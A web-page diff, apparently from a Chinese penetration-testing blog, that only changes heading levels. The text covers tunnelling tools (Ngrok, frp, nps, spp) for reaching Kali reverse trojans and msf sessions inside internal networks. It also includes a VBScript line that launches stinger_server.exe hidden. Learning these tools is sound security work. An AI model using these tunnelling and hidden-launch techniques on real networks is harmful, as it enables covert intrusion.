 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404042130028.webp" alt="image-20240404213007851" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404042130028.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404042130028.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404042130028.webp?size=large 2x" data-title="image-20240404213007851" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>坑点：使用过程中cs会话可能假死掉，需要把stinger_server.exe进程结束掉，然后重新启动。</p>
-<h5 id="四穿透工具" class="heading-element"><span>0.0.0.5  四、穿透工具</span>
+<h1 id="四穿透工具" class="heading-element"><span>四、穿透工具</span>
   <a href="#%e5%9b%9b%e7%a9%bf%e9%80%8f%e5%b7%a5%e5%85%b7" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="ngrok" class="heading-element"><span>0.0.0.5.1  Ngrok</span>
+</h1><h2 id="ngrok" class="heading-element"><span>Ngrok</span>
   <a href="#ngrok" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>支持http https tcp协议</p>
+</h2><p>支持http https tcp协议</p>
 <p><a href="https://www.ngrok.cc/"target="_blank" rel="external nofollow noopener noreferrer">https://www.ngrok.cc/</a></p>
 <p>提供免费的内网穿透服务，举个内网连接kali反向木马的例子</p>
 <ul>
@@ -895,26 +1003,26 @@ ws.run &#34;cmd /c D:\XXXXX\stinger_server.exe 0.0.0.0&#34;,vbhide</code></pre><
 <p>这样就实现了内网到内网的msf上线</p>
 </li>
 </ul>
-<h6 id="frp" class="heading-element"><span>0.0.0.5.2  frp</span>
+<h2 id="frp" class="heading-element"><span>frp</span>
   <a href="#frp" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>支持的协议更多</p>
+</h2><p>支持的协议更多</p>
 <blockquote>
 <p>上面写了</p>
 </blockquote>
-<h6 id="nps" class="heading-element"><span>0.0.0.5.3  nps</span>
+<h2 id="nps" class="heading-element"><span>nps</span>
   <a href="#nps" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>可支持tcp、udp以及他们的任何上层协议，此外还支持内网http代理、内网socks代理、p2p等，并带有强大的web管理端</p>
+</h2><p>可支持tcp、udp以及他们的任何上层协议，此外还支持内网http代理、内网socks代理、p2p等，并带有强大的web管理端</p>
 <p>项目地址：https://github.com/ehang-io/nps</p>
 <p>文档：https://ehang-io.github.io/nps/</p>
-<h6 id="spp" class="heading-element"><span>0.0.0.5.4  spp</span>
+<h2 id="spp" class="heading-element"><span>spp</span>
   <a href="#spp" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>可以任意封装流量，用来搭建隧道</p>
+</h2><p>可以任意封装流量，用来搭建隧道</p>
 <p>项目地址：https://github.com/esrrhs/spp</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221805257.webp" alt="image-20231022180544133" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221805257.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221805257.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221805257.webp?size=large 2x" data-title="image-20231022180544133" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
   <div class="post-info">
